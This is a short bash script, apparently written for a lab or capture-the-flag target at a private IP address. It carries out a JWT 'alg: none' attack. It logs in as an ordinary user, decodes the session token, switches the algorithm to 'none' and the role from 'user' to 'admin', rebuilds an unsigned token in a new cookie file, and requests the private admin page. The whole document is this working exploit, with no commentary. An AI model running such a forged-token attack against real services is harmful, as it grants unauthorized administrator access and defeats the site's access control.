#!/bin/bash

ip="10.10.150.255"; echo "LOGIN AS NORMAL USER"; curl -d "username=[removed]&password=[removed]" -X POST --silent http://$ip/auth -c jwt_none; curl -b jwt_none --silent http://$ip/private | grep -o -P '(?<=h1>\s).*(?=\s</h1)'; echo; echo "CHANGING ROLE TO ADMIN"; jwt_body=$(cat jwt_none | grep -o -P '(?<=token\s).*'); echo; echo "JWT BODY FROM COOKIE"; echo $jwt_body; header=$(echo $jwt_body | cut -d"." -f1); payload=$(echo $jwt_body | cut -d"." -f2); echo; echo "OLD HEADER"; echo $header; echo; echo "OLD PAYLOAD"; echo $payload; decoded_header=$(echo $header | base64 -d); echo; echo "OLD DECODED HEADER"; echo $decoded_header; echo; echo "CHANGE ALG TO NONE"; change_header=$(echo $decoded_header | sed 's/HS256/none/g'); echo $change_header; echo; echo "OLD DECODED PAYLOAD"; decoded_payload=$(echo $payload | base64 -d); echo $decoded_payload; echo; echo "CHANGE ROLE TO ADMIN"; change_payload=$(echo $decoded_payload | sed 's/"user"/"admin"/g'); echo $change_payload; echo; echo "ENCODE NEW HEADER AND NEW PAYLOAD"; new_header=$(echo $change_header | base64 -w 0 | tr -d "="); new_payload=$(echo $change_payload | base64 -w 0 | tr -d "="); echo $new_header; echo $new_payload; echo; echo "NEW JWT WITHOUT SECRET"; new_jwt=$new_header.$new_payload.; echo $new_jwt; echo; echo "CREATE NEW COOKIE AND STORE NEW ADMIN JWT"; cp jwt_none jwt_admin; ls -lrta jwt_admin; pattern=$(cat jwt_none | grep -o -P '(?<=token\s).*'); echo; echo "SEARCHING FOR"; echo $pattern; echo; echo -n "UPDATING COOKIE"; sed -i "s/$pattern/$new_jwt/g" jwt_admin; echo; cat jwt_admin; echo; echo "TESTING ADMIN LOGIN"; curl -b jwt_admin --silent http://$ip/private | grep "text-center"